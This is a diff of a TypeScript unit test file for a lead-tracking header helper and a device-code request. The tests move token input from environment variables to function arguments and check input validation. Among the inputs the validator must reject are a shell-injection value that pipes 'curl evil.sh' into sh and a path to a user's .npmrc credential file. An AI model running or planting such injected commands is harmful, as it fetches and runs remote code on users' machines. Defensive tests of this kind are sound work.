@@ -14,18 +14,34 @@ import { hivemindLeadHeader, requestDeviceCode } from "../../src/commands/auth.j
 describe("hivemindLeadHeader", () => {
   it("emits the header for a minted token", () => {
     const token = "lv1_9f2c41ab7d3e40559c1b8ad6e2f70c14";
-    expect(hivemindLeadHeader({ HIVEMIND_LEAD: token })).toEqual({ "X-Hivemind-Lead": token });
+    expect(hivemindLeadHeader(token)).toEqual({ "X-Hivemind-Lead": token });
   });
 
   it("trims surrounding whitespace", () => {
-    expect(hivemindLeadHeader({ HIVEMIND_LEAD: "  lv1_abcdefgh  " }))
+    expect(hivemindLeadHeader("  lv1_abcdefgh  "))
       .toEqual({ "X-Hivemind-Lead": "lv1_abcdefgh" });
   });
 
   it("omits the header when there is no token", () => {
-    expect(hivemindLeadHeader({})).toEqual({});
-    expect(hivemindLeadHeader({ HIVEMIND_LEAD: "" })).toEqual({});
-    expect(hivemindLeadHeader({ HIVEMIND_LEAD: "   " })).toEqual({});
+    expect(hivemindLeadHeader(undefined)).toEqual({});
+    expect(hivemindLeadHeader("")).toEqual({});
+    expect(hivemindLeadHeader("   ")).toEqual({});
+  });
+
+  // The helper takes the token as an ARGUMENT and never reads process.env. This
+  // module is bundled into the OpenClaw distribution, where an environment read
+  // inside a file that also sends network requests is flagged CRITICAL by the
+  // ClawHub static scan as credential harvesting. The read belongs at the CLI
+  // edge; this pins that it stays there.
+  it("does not read the environment", () => {
+    const prev = process.env.HIVEMIND_LEAD;
+    process.env.HIVEMIND_LEAD = "lv1_9f2c41ab7d3e40559c1b8ad6e2f70c14";
+    try {
+      expect(hivemindLeadHeader()).toEqual({});
+    } finally {
+      if (prev === undefined) delete process.env.HIVEMIND_LEAD;
+      else process.env.HIVEMIND_LEAD = prev;
+    }
   });
 
   // The envelope is the same one the installer and the beacon endpoint apply.
@@ -33,19 +49,19 @@ describe("hivemindLeadHeader", () => {
   // rather than arriving as a header nobody can join on.
   it("drops anything outside the envelope", () => {
     // Too short to be a token, and too long.
-    expect(hivemindLeadHeader({ HIVEMIND_LEAD: "lv1_abc" })).toEqual({});
-    expect(hivemindLeadHeader({ HIVEMIND_LEAD: "a".repeat(65) })).toEqual({});
+    expect(hivemindLeadHeader("lv1_abc")).toEqual({});
+    expect(hivemindLeadHeader("a".repeat(65))).toEqual({});
     // A path would carry a username; shell metacharacters have no business in a
     // value that travelled through a pasted command line.
-    expect(hivemindLeadHeader({ HIVEMIND_LEAD: "/home/alice/.npmrc" })).toEqual({});
-    expect(hivemindLeadHeader({ HIVEMIND_LEAD: "lv1_abc;curl evil.sh|sh" })).toEqual({});
-    expect(hivemindLeadHeader({ HIVEMIND_LEAD: "lv1_abc def" })).toEqual({});
+    expect(hivemindLeadHeader("/home/alice/.npmrc")).toEqual({});
+    expect(hivemindLeadHeader("lv1_abc;curl evil.sh|sh")).toEqual({});
+    expect(hivemindLeadHeader("lv1_abc def")).toEqual({});
   });
 
   it("accepts a shape the page has not minted yet", () => {
     // Deliberately an envelope, not `lv1_` + 32 hex: a future token format must
     // reach the backend and be counted, not vanish at the client.
-    expect(hivemindLeadHeader({ HIVEMIND_LEAD: "lv2-ABCdef_0123456789" }))
+    expect(hivemindLeadHeader("lv2-ABCdef_0123456789"))
       .toEqual({ "X-Hivemind-Lead": "lv2-ABCdef_0123456789" });
   });
 });
@@ -86,14 +102,12 @@ describe("requestDeviceCode lead header", () => {
     return mockFetch.mock.calls[0][1].headers as Record<string, string>;
   }
 
-  it("puts the token on the wire when the installer set it", async () => {
-    process.env.HIVEMIND_LEAD = "lv1_9f2c41ab7d3e40559c1b8ad6e2f70c14";
-    await requestDeviceCode("https://api.example.com");
+  it("puts the token on the wire when the CLI passes it down", async () => {
+    await requestDeviceCode("https://api.example.com", undefined, "lv1_9f2c41ab7d3e40559c1b8ad6e2f70c14");
     expect(sentHeaders()["X-Hivemind-Lead"]).toBe("lv1_9f2c41ab7d3e40559c1b8ad6e2f70c14");
   });
 
   it("sends no header for an ordinary install", async () => {
-    delete process.env.HIVEMIND_LEAD;
     await requestDeviceCode("https://api.example.com");
     expect(sentHeaders()).not.toHaveProperty("X-Hivemind-Lead");
   });
@@ -101,8 +115,7 @@ describe("requestDeviceCode lead header", () => {
   // The token is per-campaign-lead and the ref is per-campaign. One person can
   // carry both, and neither may displace the other.
   it("travels alongside the affiliate ref", async () => {
-    process.env.HIVEMIND_LEAD = "lv1_9f2c41ab7d3e40559c1b8ad6e2f70c14";
-    await requestDeviceCode("https://api.example.com", "mario");
+    await requestDeviceCode("https://api.example.com", "mario", "lv1_9f2c41ab7d3e40559c1b8ad6e2f70c14");
     expect(sentHeaders()["X-Hivemind-Lead"]).toBe("lv1_9f2c41ab7d3e40559c1b8ad6e2f70c14");
     expect(sentHeaders()["X-Hivemind-Referrer"]).toBe("mario");
   });
